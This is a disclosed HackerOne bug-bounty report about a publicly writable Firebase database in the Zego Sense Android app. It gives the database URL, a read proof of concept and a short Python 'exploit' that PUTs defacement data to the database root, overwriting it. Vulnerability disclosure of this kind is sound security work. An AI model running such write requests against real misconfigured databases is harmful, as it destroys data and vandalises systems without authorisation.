---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1065134'
original_report_id: '1065134'
title: Firebase Database Takeover in Zego Sense Android app
weakness: Improper Authentication - Generic
team_handle: zego
created_at: '2020-12-23T13:45:53.180Z'
disclosed_at: '2021-06-23T16:04:36.189Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 49
asset_identifier: com.zegocover.zego
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# Firebase Database Takeover in Zego Sense Android app

## Metadata

- HackerOne Report ID: 1065134
- Weakness: Improper Authentication - Generic
- Program: zego
- Disclosed At: 2021-06-23T16:04:36.189Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Team,

Summary:
publicly available Firebase Database (api-project-615509201590.firebaseio.com)

Platform Affected: [android]
com.zegocover.zego

Steps To Reproduce:

in res/values/strings.xml

    <string name="firebase_database_url">https://api-project-615509201590.firebaseio.com</string>

POC:

    Go to https://api-project-615509201590.firebaseio.com/.json

{F1127099}

Exploit:

    import requests
    data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
    reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)


References:


There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

Regards,
Sheikh Rishad

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if zego uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the zego.

So please immediately change the rule of the database to private so that nobody can able to access it outside.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
